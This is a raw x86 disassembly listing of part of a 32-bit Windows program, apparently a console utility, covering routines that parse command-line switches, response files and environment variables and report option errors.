  40b63c:	push   DWORD PTR [ebp-0x210]
  40b642:	mov    esi,DWORD PTR ds:0x43754c
  40b648:	call   esi
  40b64a:	xor    edi,edi
  40b64c:	mov    DWORD PTR [esp],0x402438
  40b653:	push   edi
  40b654:	lea    eax,[ebp-0x21c]
  40b65a:	push   edi
  40b65b:	push   eax
  40b65c:	mov    DWORD PTR [ebp-0x210],edi
  40b662:	call   DWORD PTR ds:0x437418
  40b668:	add    esp,0x10
  40b66b:	test   eax,eax
  40b66d:	jne    0x40b67e
  40b66f:	cmp    DWORD PTR [ebp-0x21c],edi
  40b675:	je     0x40b67e
  40b677:	mov    BYTE PTR ds:0x432633,0x1
  40b67e:	mov    edx,DWORD PTR [ebp-0x214]
  40b684:	lea    ecx,[ebx-0x1]
  40b687:	add    edx,0x4
  40b68a:	call   0x40b9a0
  40b68f:	cmp    BYTE PTR ds:0x421f10,0x0
  40b696:	jne    0x40b69d
  40b698:	call   0x40518d
  40b69d:	test   BYTE PTR ds:0x4114bc,0x2
  40b6a4:	jne    0x40b76e
  40b6aa:	call   0x40b3fa
  40b6af:	lea    eax,[ebp-0x20c]
  40b6b5:	push   eax
  40b6b6:	mov    ecx,0x40244c
  40b6bb:	push   0x40246c
  40b6c0:	push   ecx
  40b6c1:	mov    DWORD PTR ds:0x421f14,ecx
  40b6c7:	call   DWORD PTR ds:0x437458
  40b6cd:	add    esp,0xc
  40b6d0:	cmp    WORD PTR [ebp-0x20c],di
  40b6d7:	je     0x40b76e
  40b6dd:	push   0x20
  40b6df:	lea    eax,[ebp-0x20c]
  40b6e5:	push   0x4015bc
  40b6ea:	push   eax
  40b6eb:	call   DWORD PTR ds:0x4373dc
  40b6f1:	add    esp,0xc
  40b6f4:	mov    ds:0x421f0c,eax
  40b6f9:	test   eax,eax
  40b6fb:	jne    0x40b712
  40b6fd:	lea    eax,[ebp-0x20c]
  40b703:	push   eax
  40b704:	push   0x41d
  40b709:	push   edi
  40b70a:	call   0x405021
  40b70f:	add    esp,0xc
  40b712:	call   0x408086
  40b717:	test   al,al
  40b719:	jne    0x40b736
  40b71b:	push   DWORD PTR ds:0x421f0c
  40b721:	call   DWORD PTR ds:0x4373e0
  40b727:	pop    ecx
  40b728:	cmp    eax,0xffffffff
  40b72b:	jne    0x40b76e
  40b72d:	lea    eax,[ebp-0x20c]
  40b733:	push   eax
  40b734:	jmp    0x40b760
  40b736:	inc    DWORD PTR ds:0x4216d4
  40b73c:	mov    BYTE PTR ds:0x421f11,0x1
  40b743:	call   0x40c332
  40b748:	push   DWORD PTR ds:0x421f0c
  40b74e:	call   DWORD PTR ds:0x4373e0
  40b754:	pop    ecx
  40b755:	cmp    eax,0xffffffff
  40b758:	jne    0x40b76e
  40b75a:	push   DWORD PTR ds:0x421f14
  40b760:	push   0x424
  40b765:	push   edi
  40b766:	call   0x405021
  40b76b:	add    esp,0xc
  40b76e:	mov    ecx,0x411040
  40b773:	call   0x40dd18
  40b778:	push   eax
  40b779:	push   0x402424
  40b77e:	call   DWORD PTR ds:0x4373cc
  40b784:	pop    ecx
  40b785:	pop    ecx
  40b786:	test   eax,eax
  40b788:	je     0x40b797
  40b78a:	push   0x41f
  40b78f:	push   edi
  40b790:	call   0x405021
  40b795:	pop    ecx
  40b796:	pop    ecx
  40b797:	cmp    DWORD PTR ds:0x432420,edi
  40b79d:	jne    0x40b7a4
  40b79f:	call   0x40bca0
  40b7a4:	call   0x40b8d5
  40b7a9:	call   0x40b805
  40b7ae:	mov    DWORD PTR ds:0x4216e0,edi
  40b7b4:	call   0x40d8fb
  40b7b9:	test   BYTE PTR ds:0x4114bc,0x1
  40b7c0:	je     0x40b7d1
  40b7c2:	call   0x40c805
  40b7c7:	call   0x40c876
  40b7cc:	call   0x40c916
  40b7d1:	mov    eax,ds:0x431f2c
  40b7d6:	test   eax,eax
  40b7d8:	je     0x40b7de
  40b7da:	push   eax
  40b7db:	call   esi
  40b7dd:	pop    ecx
  40b7de:	call   0x4035b0
  40b7e3:	push   DWORD PTR [ebp-0x218]
  40b7e9:	mov    esi,eax
  40b7eb:	call   DWORD PTR ds:0x437550
  40b7f1:	pop    ecx
  40b7f2:	mov    ecx,DWORD PTR [ebp-0x4]
  40b7f5:	pop    edi
  40b7f6:	mov    eax,esi
  40b7f8:	pop    esi
  40b7f9:	xor    ecx,ebp
  40b7fb:	pop    ebx
  40b7fc:	call   0x40fd0b
  40b801:	leave  
  40b802:	ret    0x4
  40b805:	push   esi
  40b806:	mov    esi,DWORD PTR ds:0x432420
  40b80c:	test   esi,esi
  40b80e:	je     0x40b8cd
  40b814:	push   ebx
  40b815:	xor    ebx,ebx
  40b817:	mov    ecx,DWORD PTR [esi+0x4]
  40b81a:	cmp    WORD PTR [ecx],0x2d
  40b81e:	jne    0x40b842
  40b820:	cmp    WORD PTR [ecx+0x2],bx
  40b824:	jne    0x40b842
  40b826:	mov    ecx,0x402478
  40b82b:	call   0x40dd18
  40b830:	mov    ds:0x421f14,eax
  40b835:	call   DWORD PTR ds:0x43741c
  40b83b:	mov    ds:0x421f0c,eax
  40b840:	jmp    0x40b87a
  40b842:	call   0x40dd18
  40b847:	push   0x20
  40b849:	push   0x4015bc
  40b84e:	push   eax
  40b84f:	mov    ds:0x421f14,eax
  40b854:	call   DWORD PTR ds:0x4373dc
  40b85a:	add    esp,0xc
  40b85d:	mov    ds:0x421f0c,eax
  40b862:	test   eax,eax
  40b864:	jne    0x40b87a
  40b866:	push   DWORD PTR ds:0x421f14
  40b86c:	push   0x41c
  40b871:	push   ebx
  40b872:	call   0x405021
  40b877:	add    esp,0xc
  40b87a:	mov    DWORD PTR ds:0x4216d4,ebx
  40b880:	mov    BYTE PTR ds:0x421f11,bl
  40b886:	call   0x40c332
  40b88b:	call   DWORD PTR ds:0x43741c
  40b891:	mov    ecx,DWORD PTR ds:0x421f0c
  40b897:	cmp    ecx,eax
  40b899:	je     0x40b8bc
  40b89b:	push   ecx
  40b89c:	call   DWORD PTR ds:0x4373e0
  40b8a2:	pop    ecx
  40b8a3:	cmp    eax,0xffffffff
  40b8a6:	jne    0x40b8bc
  40b8a8:	push   DWORD PTR ds:0x421f14
  40b8ae:	push   0x424
  40b8b3:	push   ebx
  40b8b4:	call   0x405021
  40b8b9:	add    esp,0xc
  40b8bc:	mov    esi,DWORD PTR [esi]
  40b8be:	test   esi,esi
  40b8c0:	jne    0x40b817
  40b8c6:	mov    esi,DWORD PTR ds:0x432420
  40b8cc:	pop    ebx
  40b8cd:	mov    ecx,esi
  40b8cf:	pop    esi
  40b8d0:	jmp    0x4047d9
  40b8d5:	push   ebp
  40b8d6:	mov    ebp,esp
  40b8d8:	push   ecx
  40b8d9:	push   ecx
  40b8da:	mov    eax,ds:0x4374a0
  40b8df:	push   esi
  40b8e0:	mov    esi,DWORD PTR [eax]
  40b8e2:	mov    eax,DWORD PTR [esi]
  40b8e4:	test   eax,eax
  40b8e6:	je     0x40b99d
  40b8ec:	push   ebx
  40b8ed:	push   edi
  40b8ee:	push   0x3d
  40b8f0:	xor    ebx,ebx
  40b8f2:	pop    edx
  40b8f3:	mov    DWORD PTR [ebp-0x4],ebx
  40b8f6:	push   edx
  40b8f7:	push   eax
  40b8f8:	call   DWORD PTR ds:0x437540
  40b8fe:	mov    edi,eax
  40b900:	pop    ecx
  40b901:	pop    ecx
  40b902:	test   edi,edi
  40b904:	je     0x40b98b
  40b90a:	push   0x8
  40b90c:	push   0x402424
  40b911:	push   DWORD PTR [esi]
  40b913:	call   DWORD PTR ds:0x437414
  40b919:	add    esp,0xc
  40b91c:	test   eax,eax
  40b91e:	je     0x40b98b
  40b920:	xor    eax,eax
  40b922:	mov    WORD PTR [edi],ax
  40b925:	mov    ecx,DWORD PTR [esi]
  40b927:	cmp    WORD PTR [ecx],bx
  40b92a:	je     0x40b98b
  40b92c:	call   0x40dd18
  40b931:	mov    ebx,eax
  40b933:	lea    edx,[eax+0x2]
  40b936:	mov    cx,WORD PTR [eax]
  40b939:	add    eax,0x2
  40b93c:	cmp    cx,WORD PTR [ebp-0x4]
  40b940:	jne    0x40b936
  40b942:	sub    eax,edx
  40b944:	sar    eax,1
  40b946:	inc    eax
  40b947:	push   eax
  40b948:	push   ebx
  40b949:	call   DWORD PTR ds:0x4374a4
  40b94f:	pop    ecx
  40b950:	pop    ecx
  40b951:	lea    ecx,[edi+0x2]
  40b954:	call   0x40dd18
  40b959:	push   0x3d
  40b95b:	pop    ecx
  40b95c:	mov    WORD PTR [edi],cx
  40b95f:	xor    ecx,ecx
  40b961:	mov    BYTE PTR ds:0x4114bd,cl
  40b967:	push   0x4
  40b969:	mov    edx,eax
  40b96b:	mov    ecx,ebx
  40b96d:	mov    DWORD PTR [ebp-0x8],eax
  40b970:	call   0x4030cf
  40b975:	test   al,al
  40b977:	jne    0x40b989
  40b979:	push   ebx
  40b97a:	mov    ebx,DWORD PTR ds:0x43754c
  40b980:	call   ebx
  40b982:	push   DWORD PTR [ebp-0x8]
  40b985:	call   ebx
  40b987:	pop    ecx
  40b988:	pop    ecx
  40b989:	xor    ebx,ebx
  40b98b:	add    esi,0x4
  40b98e:	push   0x3d
  40b990:	mov    eax,DWORD PTR [esi]
  40b992:	pop    edx
  40b993:	test   eax,eax
  40b995:	jne    0x40b8f6
  40b99b:	pop    edi
  40b99c:	pop    ebx
  40b99d:	pop    esi
  40b99e:	leave  
  40b99f:	ret    
  40b9a0:	push   ebp
  40b9a1:	mov    ebp,esp
  40b9a3:	and    esp,0xfffffff8
  40b9a6:	sub    esp,0x14
  40b9a9:	push   ebx
  40b9aa:	mov    eax,ecx
  40b9ac:	xor    ebx,ebx
  40b9ae:	push   esi
  40b9af:	push   edi
  40b9b0:	mov    DWORD PTR [esp+0x14],edx
  40b9b4:	mov    DWORD PTR [esp+0x18],eax
  40b9b8:	mov    BYTE PTR [esp+0x13],bl
  40b9bc:	test   eax,eax
  40b9be:	je     0x40bc99
  40b9c4:	mov    edi,DWORD PTR [edx+ebx*4]
  40b9c7:	push   0x2d
  40b9c9:	movzx  eax,WORD PTR [edi]
  40b9cc:	pop    ecx
  40b9cd:	cmp    eax,0x40
  40b9d0:	jne    0x40b9df
  40b9d2:	lea    ecx,[edi+0x2]
  40b9d5:	call   0x404e37
  40b9da:	jmp    0x40bc40
  40b9df:	cmp    ax,cx
  40b9e2:	je     0x40bada
  40b9e8:	cmp    eax,0x2f
  40b9eb:	je     0x40bada
  40b9f1:	push   0x3d
  40b9f3:	push   edi
  40b9f4:	call   DWORD PTR ds:0x437540
  40b9fa:	mov    esi,eax
  40b9fc:	pop    ecx
  40b9fd:	pop    ecx
  40b9fe:	test   esi,esi
  40ba00:	je     0x40ba7f
  40ba02:	cmp    esi,edi
  40ba04:	jne    0x40ba15
  40ba06:	xor    eax,eax
  40ba08:	push   0x427
  40ba0d:	push   eax
  40ba0e:	call   0x405021
  40ba13:	pop    ecx
  40ba14:	pop    ecx
  40ba15:	xor    eax,eax
  40ba17:	mov    WORD PTR [esi],ax
  40ba1a:	push   0x20
  40ba1c:	lea    eax,[esi-0x2]
  40ba1f:	add    esi,0x2
  40ba22:	pop    edx
  40ba23:	movzx  ecx,WORD PTR [eax]
  40ba26:	cmp    cx,dx
  40ba29:	je     0x40ba30
  40ba2b:	cmp    ecx,0x9
  40ba2e:	jne    0x40ba35
  40ba30:	sub    eax,0x2
  40ba33:	jmp    0x40ba23
  40ba35:	xor    ecx,ecx
  40ba37:	push   0x2
  40ba39:	push   ecx
  40ba3a:	push   0x401090
  40ba3f:	push   esi
  40ba40:	mov    WORD PTR [eax+0x2],cx
  40ba44:	mov    BYTE PTR ds:0x4114bd,0x1
  40ba4b:	call   DWORD PTR ds:0x4373f0
  40ba51:	pop    ecx
  40ba52:	pop    ecx
  40ba53:	lea    ecx,[esi+eax*2]
  40ba56:	call   0x40dd18
  40ba5b:	push   0x401090
  40ba60:	push   edi
  40ba61:	mov    esi,eax
  40ba63:	call   DWORD PTR ds:0x4373f0
  40ba69:	pop    ecx
  40ba6a:	pop    ecx
  40ba6b:	lea    ecx,[edi+eax*2]
  40ba6e:	call   0x40dd18
  40ba73:	pop    ecx
  40ba74:	mov    edx,esi
  40ba76:	mov    ecx,eax
  40ba78:	call   0x4030cf
  40ba7d:	jmp    0x40bacc
  40ba7f:	mov    ecx,edi
  40ba81:	call   0x40c044
  40ba86:	xor    eax,eax
  40ba88:	cmp    WORD PTR [edi],ax
  40ba8b:	je     0x40bacc
  40ba8d:	call   0x40dcc8
  40ba92:	push   0x20
  40ba94:	mov    esi,eax
  40ba96:	pop    eax
  40ba97:	push   eax
  40ba98:	push   edi
  40ba99:	call   DWORD PTR ds:0x437540
  40ba9f:	pop    ecx
  40baa0:	pop    ecx
  40baa1:	mov    ecx,edi
  40baa3:	test   eax,eax
  40baa5:	je     0x40baae
  40baa7:	call   0x40dd5c
  40baac:	jmp    0x40bab3
  40baae:	call   0x40dd18
  40bab3:	mov    DWORD PTR [esi+0x4],eax
  40bab6:	mov    eax,ds:0x4216c0
  40babb:	mov    ecx,0x4216c0
  40bac0:	jmp    0x40bac6
  40bac2:	mov    ecx,eax
  40bac4:	mov    eax,DWORD PTR [ecx]
  40bac6:	test   eax,eax
  40bac8:	jne    0x40bac2
  40baca:	mov    DWORD PTR [ecx],esi
  40bacc:	mov    edx,DWORD PTR [esp+0x14]
  40bad0:	xor    edi,edi
  40bad2:	mov    DWORD PTR [edx+ebx*4],edi
  40bad5:	jmp    0x40bc44
  40bada:	lea    esi,[edi+0x2]
  40badd:	push   0x402484
  40bae2:	push   esi
  40bae3:	call   DWORD PTR ds:0x437548
  40bae9:	pop    ecx
  40baea:	pop    ecx
  40baeb:	test   eax,eax
  40baed:	je     0x40bc55
  40baf3:	xor    edi,edi
  40baf5:	jmp    0x40bb3f
  40baf7:	push   0x402490
  40bafc:	push   esi
  40bafd:	call   DWORD PTR ds:0x437548
  40bb03:	pop    ecx
  40bb04:	pop    ecx
  40bb05:	test   eax,eax
  40bb07:	je     0x40bc35
  40bb0d:	movzx  ecx,WORD PTR [esi]
  40bb10:	cmp    ecx,0x3f
  40bb13:	je     0x40bc29
  40bb19:	cmp    ecx,0x66
  40bb1c:	je     0x40bbd7
  40bb22:	cmp    ecx,0x46
  40bb25:	je     0x40bbd7
  40bb2b:	cmp    ecx,0x78
  40bb2e:	je     0x40bb49
  40bb30:	cmp    ecx,0x58
  40bb33:	je     0x40bb49
  40bb35:	mov    dl,0x1
  40bb37:	call   0x40bd70
  40bb3c:	add    esi,0x2
  40bb3f:	cmp    WORD PTR [esi],di
  40bb42:	jne    0x40baf7
  40bb44:	jmp    0x40bc40
  40bb49:	add    esi,0x2
  40bb4c:	xor    eax,eax
  40bb4e:	cmp    WORD PTR [esi],ax
  40bb51:	jne    0x40bb75
  40bb53:	inc    ebx
  40bb54:	cmp    ebx,DWORD PTR [esp+0x18]
  40bb58:	jae    0x40bb66
  40bb5a:	mov    esi,DWORD PTR [esp+0x14]
  40bb5e:	mov    esi,DWORD PTR [esi+ebx*4]
  40bb61:	cmp    WORD PTR [esi],ax
  40bb64:	jne    0x40bb75
  40bb66:	push   0x426
  40bb6b:	push   eax
  40bb6c:	call   0x405021
  40bb71:	pop    ecx
  40bb72:	pop    ecx
  40bb73:	xor    eax,eax
  40bb75:	push   0x2d
  40bb77:	pop    ecx
  40bb78:	cmp    WORD PTR [esi],cx
  40bb7b:	jne    0x40bb98
  40bb7d:	cmp    WORD PTR [esi+0x2],ax
  40bb81:	jne    0x40bb98
  40bb83:	call   DWORD PTR ds:0x43741c
  40bb89:	push   0x20
  40bb8b:	pop    ecx
  40bb8c:	add    ecx,eax
  40bb8e:	call   0x40c24f
  40bb93:	jmp    0x40bc40
  40bb98:	push   0x4024a0
  40bb9d:	lea    eax,[esp+0x20]
  40bba1:	push   esi
  40bba2:	push   eax
  40bba3:	call   DWORD PTR ds:0x4374a8
  40bba9:	add    esp,0xc
  40bbac:	test   eax,eax
  40bbae:	je     0x40bbc1
  40bbb0:	push   esi
  40bbb1:	xor    eax,eax
  40bbb3:	push   0x418
  40bbb8:	push   eax
  40bbb9:	call   0x405021
  40bbbe:	add    esp,0xc
  40bbc1:	mov    ecx,DWORD PTR [esp+0x1c]
  40bbc5:	call   0x40c24f
  40bbca:	push   DWORD PTR [esp+0x1c]
  40bbce:	call   DWORD PTR ds:0x4373e0
  40bbd4:	pop    ecx
  40bbd5:	jmp    0x40bc40
  40bbd7:	add    esi,0x2
  40bbda:	cmp    WORD PTR [esi],di
  40bbdd:	jne    0x40bbff
  40bbdf:	inc    ebx
  40bbe0:	cmp    ebx,DWORD PTR [esp+0x18]
  40bbe4:	jae    0x40bbf2
  40bbe6:	mov    esi,DWORD PTR [esp+0x14]
  40bbea:	mov    esi,DWORD PTR [esi+ebx*4]
  40bbed:	cmp    WORD PTR [esi],di
  40bbf0:	jne    0x40bbff
  40bbf2:	push   0x425
  40bbf7:	push   edi
  40bbf8:	call   0x405021
  40bbfd:	pop    ecx
  40bbfe:	pop    ecx
  40bbff:	call   0x40dcc8
  40bc04:	mov    ecx,esi
  40bc06:	mov    edi,eax
  40bc08:	call   0x40dd18
  40bc0d:	mov    DWORD PTR [edi+0x4],eax
  40bc10:	mov    ecx,DWORD PTR ds:0x432420
  40bc16:	mov    edx,0x432420
  40bc1b:	jmp    0x40bc21
  40bc1d:	mov    edx,ecx
  40bc1f:	mov    ecx,DWORD PTR [edx]
  40bc21:	test   ecx,ecx
  40bc23:	jne    0x40bc1d
  40bc25:	mov    DWORD PTR [edx],edi
  40bc27:	jmp    0x40bc40
  40bc29:	mov    edx,DWORD PTR [esp+0x14]
  40bc2d:	mov    cl,0x1
  40bc2f:	mov    BYTE PTR [esp+0x13],cl
  40bc33:	jmp    0x40bc48
  40bc35:	mov    cx,WORD PTR [esi+0x4]
  40bc39:	mov    dl,0x1
  40bc3b:	call   0x40bd70
  40bc40:	mov    edx,DWORD PTR [esp+0x14]
  40bc44:	mov    cl,BYTE PTR [esp+0x13]
  40bc48:	inc    ebx
  40bc49:	cmp    ebx,DWORD PTR [esp+0x18]
  40bc4d:	jb     0x40b9c4
  40bc53:	jmp    0x40bc57
  40bc55:	mov    cl,0x1
  40bc57:	test   cl,cl
  40bc59:	je     0x40bc99
  40bc5b:	push   0x64
  40bc5d:	pop    edi
  40bc5e:	push   0x67
  40bc60:	pop    esi
  40bc61:	push   0x401644
  40bc66:	push   edi
  40bc67:	call   0x4050f7
  40bc6c:	inc    edi
  40bc6d:	pop    ecx
  40bc6e:	pop    ecx
  40bc6f:	cmp    edi,esi
  40bc71:	jb     0x40bc61
  40bc73:	cmp    esi,0x71
  40bc76:	jne    0x40bc7b
  40bc78:	push   0x72
  40bc7a:	pop    esi
  40bc7b:	cmp    esi,0x79
  40bc7e:	jne    0x40bc83
  40bc80:	push   0x7a
  40bc82:	pop    esi
  40bc83:	push   esi
  40bc84:	call   0x4050f7
  40bc89:	inc    esi
  40bc8a:	pop    ecx
  40bc8b:	cmp    esi,0x7c
  40bc8e:	jbe    0x40bc73
  40bc90:	xor    eax,eax
  40bc92:	push   eax
  40bc93:	call   DWORD PTR ds:0x4373ec
  40bc99:	pop    edi
  40bc9a:	pop    esi
  40bc9b:	pop    ebx
  40bc9c:	mov    esp,ebp
  40bc9e:	pop    ebp
  40bc9f:	ret    
  40bca0:	push   ebp
  40bca1:	mov    ebp,esp
  40bca3:	and    esp,0xfffffff8
  40bca6:	sub    esp,0x460
  40bcac:	mov    eax,ds:0x411018
  40bcb1:	xor    eax,esp
  40bcb3:	mov    DWORD PTR [esp+0x45c],eax
  40bcba:	push   ebx
  40bcbb:	push   esi
  40bcbc:	push   0x4
  40bcbe:	mov    ebx,0x4024a8
  40bcc3:	push   ebx
  40bcc4:	call   DWORD PTR ds:0x4374ac
  40bcca:	pop    ecx
  40bccb:	pop    ecx
  40bccc:	test   eax,eax
  40bcce:	jne    0x40bce9
  40bcd0:	call   0x40dcc8
  40bcd5:	mov    ecx,ebx
  40bcd7:	mov    esi,eax
  40bcd9:	call   0x40dd18
  40bcde:	mov    DWORD PTR [esi+0x4],eax
  40bce1:	mov    DWORD PTR ds:0x432420,esi
  40bce7:	jmp    0x40bd5c
  40bce9:	mov    esi,DWORD PTR ds:0x4216c0
  40bcef:	test   esi,esi
  40bcf1:	je     0x40bd45
  40bcf3:	mov    esi,DWORD PTR [esi+0x4]
  40bcf6:	push   0x4
  40bcf8:	push   esi
  40bcf9:	call   DWORD PTR ds:0x4374ac
  40bcff:	pop    ecx
  40bd00:	pop    ecx
  40bd01:	test   eax,eax
  40bd03:	jne    0x40bd5c
  40bd05:	push   0x2e
  40bd07:	push   esi
  40bd08:	call   DWORD PTR ds:0x43745c
  40bd0e:	pop    ecx
  40bd0f:	pop    ecx
  40bd10:	test   eax,eax
  40bd12:	je     0x40bd30
  40bd14:	lea    ecx,[esp+0x8]
  40bd18:	push   ecx
  40bd19:	push   eax
  40bd1a:	push   esi
  40bd1b:	mov    edx,0x101
  40bd20:	lea    ecx,[esp+0x264]
  40bd27:	call   0x40d49d
  40bd2c:	test   eax,eax
  40bd2e:	jne    0x40bd5c
  40bd30:	mov    ecx,DWORD PTR ds:0x4216c0
  40bd36:	mov    eax,DWORD PTR [ecx]
  40bd38:	mov    ds:0x4216c0,eax
  40bd3d:	mov    DWORD PTR ds:0x432420,ecx
  40bd43:	jmp    0x40bd5c
  40bd45:	test   BYTE PTR ds:0x4114bc,0x1
  40bd4c:	jne    0x40bd5c
  40bd4e:	push   0x428
  40bd53:	push   0x0
  40bd55:	call   0x405021
  40bd5a:	pop    ecx
  40bd5b:	pop    ecx
  40bd5c:	mov    ecx,DWORD PTR [esp+0x464]
  40bd63:	pop    esi
  40bd64:	pop    ebx
  40bd65:	xor    ecx,esp
  40bd67:	call   0x40fd0b
  40bd6c:	mov    esp,ebp
  40bd6e:	pop    ebp
  40bd6f:	ret    
  40bd70:	push   ebp
  40bd71:	mov    ebp,esp
  40bd73:	sub    esp,0xc
  40bd76:	push   ebx
  40bd77:	push   esi
  40bd78:	movzx  eax,cx
  40bd7b:	push   edi
  40bd7c:	push   ecx
  40bd7d:	mov    BYTE PTR [ebp-0x1],dl
  40bd80:	mov    DWORD PTR [ebp-0x8],eax
  40bd83:	mov    esi,0x4114be
  40bd88:	call   DWORD PTR ds:0x43740c
  40bd8e:	movzx  edi,ax
  40bd91:	pop    ecx
  40bd92:	mov    eax,edi
  40bd94:	xor    ecx,ecx
  40bd96:	cmp    eax,0x4c
  40bd99:	jg     0x40be21
  40bd9f:	je     0x40be1d
  40bda1:	cmp    eax,0x44
  40bda4:	jg     0x40bde4
  40bda6:	je     0x40bde0
  40bda8:	sub    eax,0x20
  40bdab:	je     0x40bf51
  40bdb1:	sub    eax,0x21
  40bdb4:	je     0x40bddc
  40bdb6:	dec    eax
  40bdb7:	je     0x40bdd0
  40bdb9:	dec    eax
  40bdba:	jne    0x40be88
  40bdc0:	mov    bl,0x20
  40bdc2:	mov    esi,0x4114bc
  40bdc7:	mov    BYTE PTR ds:0x421f10,0x1
  40bdce:	jmp    0x40be3d
  40bdd0:	mov    BYTE PTR ds:0x4216e6,0x1
  40bdd7:	jmp    0x40bf51
  40bddc:	mov    bl,0x10
  40bdde:	jmp    0x40be3d
  40bde0:	mov    bl,0x1
  40bde2:	jmp    0x40be3d
  40bde4:	sub    eax,0x45
  40bde7:	je     0x40be14
  40bde9:	push   0x2
  40bdeb:	pop    ebx
  40bdec:	sub    eax,ebx
  40bdee:	je     0x40be08
  40bdf0:	sub    eax,ebx
  40bdf2:	je     0x40be3d
  40bdf4:	sub    eax,ebx
  40bdf6:	jne    0x40be88
  40bdfc:	mov    BYTE PTR ds:0x4216e7,0x1
  40be03:	jmp    0x40bf51
  40be08:	mov    BYTE PTR ds:0x421f13,0x1
  40be0f:	jmp    0x40bf51
  40be14:	mov    bl,0x4
  40be16:	mov    esi,0x4114bc
  40be1b:	jmp    0x40be3d
  40be1d:	mov    bl,0x80
  40be1f:	jmp    0x40bdc2
  40be21:	cmp    eax,0x52
  40be24:	jg     0x40be78
  40be26:	je     0x40be74
  40be28:	sub    eax,0x4e
  40be2b:	je     0x40be70
  40be2d:	dec    eax
  40be2e:	je     0x40be64
  40be30:	dec    eax
  40be31:	je     0x40be60
  40be33:	dec    eax
  40be34:	jne    0x40be88
  40be36:	mov    esi,0x4114bc
  40be3b:	mov    bl,0x8
  40be3d:	cmp    DWORD PTR ds:0x43241c,0x0
  40be44:	jne    0x40beb4
  40be46:	mov    ecx,0x402424
  40be4b:	call   0x40a26b
  40be50:	mov    ecx,DWORD PTR [eax+0x8]
  40be53:	mov    ds:0x43241c,eax
  40be58:	mov    DWORD PTR ds:0x432418,ecx
  40be5e:	jmp    0x40beba
  40be60:	mov    bl,0x1
  40be62:	jmp    0x40be16
  40be64:	mov    BYTE PTR ds:0x4216e5,0x1
  40be6b:	jmp    0x40bf51
  40be70:	mov    bl,0x4
  40be72:	jmp    0x40be3d
  40be74:	mov    bl,0x2
  40be76:	jmp    0x40be16
  40be78:	sub    eax,0x53
  40be7b:	je     0x40be3b
  40be7d:	dec    eax
  40be7e:	je     0x40bead
  40be80:	dec    eax
  40be81:	je     0x40bea9
  40be83:	sub    eax,0x4
  40be86:	je     0x40bea2
  40be88:	mov    eax,DWORD PTR [ebp-0x8]
  40be8b:	movzx  eax,ax
  40be8e:	push   eax
  40be8f:	push   0x429
  40be94:	push   ecx
  40be95:	call   0x405021
  40be9a:	mov    bl,BYTE PTR [ebp-0x1]
  40be9d:	add    esp,0xc
  40bea0:	jmp    0x40be3d
  40bea2:	mov    bl,0x40
  40bea4:	jmp    0x40be16
  40bea9:	mov    bl,0x40
  40beab:	jmp    0x40be3d
  40bead:	mov    bl,0x10
  40beaf:	jmp    0x40be16
  40beb4:	mov    ecx,DWORD PTR ds:0x432418
  40beba:	cmp    BYTE PTR [ebp-0x1],0x0
  40bebe:	je     0x40bef6
  40bec0:	or     BYTE PTR [esi],bl
  40bec2:	mov    al,BYTE PTR [esi]
  40bec4:	cmp    edi,0x51
  40bec7:	jne    0x40becd
  40bec9:	or     al,0x20
  40becb:	mov    BYTE PTR [esi],al
  40becd:	mov    esi,DWORD PTR ds:0x437540
  40bed3:	push   edi
  40bed4:	push   DWORD PTR [ecx+0x4]
  40bed7:	call   esi
  40bed9:	pop    ecx
  40beda:	pop    ecx
  40bedb:	test   eax,eax
  40bedd:	jne    0x40bf23
  40bedf:	mov    eax,ds:0x432418
  40bee4:	push   0x20
  40bee6:	push   DWORD PTR [eax+0x4]
  40bee9:	call   esi
  40beeb:	pop    ecx
  40beec:	pop    ecx
  40beed:	test   eax,eax
  40beef:	je     0x40bf23
  40bef1:	mov    WORD PTR [eax],di
  40bef4:	jmp    0x40bf23
  40bef6:	cmp    esi,0x4114be
  40befc:	jne    0x40bf51
  40befe:	not    bl
  40bf00:	and    BYTE PTR [esi],bl
  40bf02:	push   edi
  40bf03:	push   DWORD PTR [ecx+0x4]
  40bf06:	call   DWORD PTR ds:0x437540
  40bf0c:	pop    ecx
  40bf0d:	pop    ecx
  40bf0e:	test   eax,eax
  40bf10:	je     0x40bf23
  40bf12:	xor    esi,esi
  40bf14:	mov    cx,WORD PTR [eax+0x2]
  40bf18:	mov    WORD PTR [eax],cx
  40bf1b:	lea    eax,[eax+0x2]
  40bf1e:	cmp    WORD PTR [eax],si
  40bf21:	jne    0x40bf14
  40bf23:	mov    ecx,0x411040
  40bf28:	call   0x40dd18
  40bf2d:	push   eax
  40bf2e:	push   0x402424
  40bf33:	call   DWORD PTR ds:0x4373cc
  40bf39:	pop    ecx
  40bf3a:	pop    ecx
  40bf3b:	test   eax,eax
  40bf3d:	je     0x40bf51
  40bf3f:	push   0x41f
  40bf44:	push   DWORD PTR ds:0x4216d4
  40bf4a:	call   0x405021
  40bf4f:	pop    ecx
  40bf50:	pop    ecx
  40bf51:	pop    edi
  40bf52:	pop    esi
  40bf53:	pop    ebx
  40bf54:	leave  
  40bf55:	ret    
  40bf56:	push   esi
  40bf57:	mov    esi,DWORD PTR ds:0x437498
  40bf5d:	push   0x1
  40bf5f:	push   0x2
  40bf61:	call   esi
  40bf63:	push   0x1
  40bf65:	push   0xf
  40bf67:	call   esi
  40bf69:	add    esp,0x10
  40bf6c:	cmp    BYTE PTR ds:0x432632,0x0
  40bf73:	je     0x40bff2
  40bf75:	test   BYTE PTR ds:0x4114be,0x4
  40bf7c:	jne    0x40bff2
  40bf7e:	test   BYTE PTR ds:0x4114bc,0x10
  40bf85:	jne    0x40bff2
  40bf87:	mov    eax,ds:0x421f04
  40bf8c:	test   eax,eax
  40bf8e:	je     0x40bff2
  40bf90:	push   0x0
  40bf92:	push   eax
  40bf93:	call   DWORD PTR ds:0x4374ac
  40bf99:	pop    ecx
  40bf9a:	pop    ecx
  40bf9b:	test   eax,eax
  40bf9d:	je     0x40bff2
  40bf9f:	mov    esi,DWORD PTR ds:0x4216cc
  40bfa5:	push   edi
  40bfa6:	mov    edi,DWORD PTR ds:0x421f04
  40bfac:	test   esi,esi
  40bfae:	je     0x40bfcc
  40bfb0:	push   edi
  40bfb1:	push   DWORD PTR [esi+0x4]
  40bfb4:	call   DWORD PTR ds:0x437548
  40bfba:	pop    ecx
  40bfbb:	pop    ecx
  40bfbc:	test   eax,eax
  40bfbe:	je     0x40bff1
  40bfc0:	mov    esi,DWORD PTR [esi]
  40bfc2:	test   esi,esi
  40bfc4:	jne    0x40bfb0
  40bfc6:	mov    edi,DWORD PTR ds:0x421f04
  40bfcc:	push   edi
  40bfcd:	call   DWORD PTR ds:0x4374b0
  40bfd3:	pop    ecx
  40bfd4:	test   eax,eax
